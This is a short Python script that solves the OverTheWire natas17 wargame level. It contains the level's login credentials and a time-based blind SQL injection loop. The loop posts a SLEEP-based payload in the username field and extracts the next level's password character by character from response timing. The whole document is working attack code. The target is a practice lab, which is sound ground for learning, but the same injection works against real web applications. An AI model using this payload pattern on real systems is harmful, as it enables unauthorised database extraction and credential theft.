import requests, string

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

charset = string.ascii_letters + string.digits # a-z, A-Z, 0-9

found = ""
for pos in range(1, 33):
    for ch in charset:
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}", SLEEP(5), 0) -- -'
        r = requests.post(url, data={"username": payload}, auth=auth)
        if (r.elapsed.total_seconds() > 5):
            found += ch
            print(f"[+] Found so far: {found}")
            break
    else:
        raise SystemExit(f"No match at position {pos}, try a larger SLEEP or lower threshold.")

print(f"\n[✅] Final password for natas18: {found}")